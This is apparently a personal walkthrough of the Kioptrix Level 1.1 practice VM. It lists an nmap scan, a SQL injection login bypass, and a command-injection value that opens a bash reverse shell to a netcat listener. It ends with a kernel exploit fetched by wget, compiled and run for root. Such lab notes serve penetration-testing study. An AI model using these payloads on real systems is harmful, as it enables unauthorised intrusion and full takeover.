--------------------------------
# Author Shubham Ranpise
--------------------------------

# 10/december/2022

# Kioptrix level 1.1

----------------------------------------------------------------
# nmap scan (got website on port 80)
----------------------------------------------------------------
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
111/tcp  open  rpcbind  2 (RPC #100000)
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
631/tcp  open  ipp      CUPS 1.1
1002/tcp open  status   1 (RPC #100024)
3306/tcp open  mysql    MySQL (unauthorized)

----------------------------------------------------------------
# website is vulnerable to sql injection in login form
----------------------------------------------------------------
' or 1=1 --

----------------------------------------------------------------
# got Basic Administrative Web Console (got reverse shell)
----------------------------------------------------------------
nc -lvnp 6969
10.0.2.9;bash -i >& /dev/tcp/10.0.2.9/6969 0>&1

----------------------------------------------------------------
# exploit vulnerable kernal version to get root access
----------------------------------------------------------------
uname -r   2.6.9-55.EL
exploit availble on exploitdb https://www.exploit-db.com/exploits/9542

-> python3 -m http.server 80
-> cd /tmp
-> wget http://10.0.2.9/9542.c
-> gcc -o explot 9542.c && ./explot
-> id uid=0(root) gid=0(root) groups=48(apache)
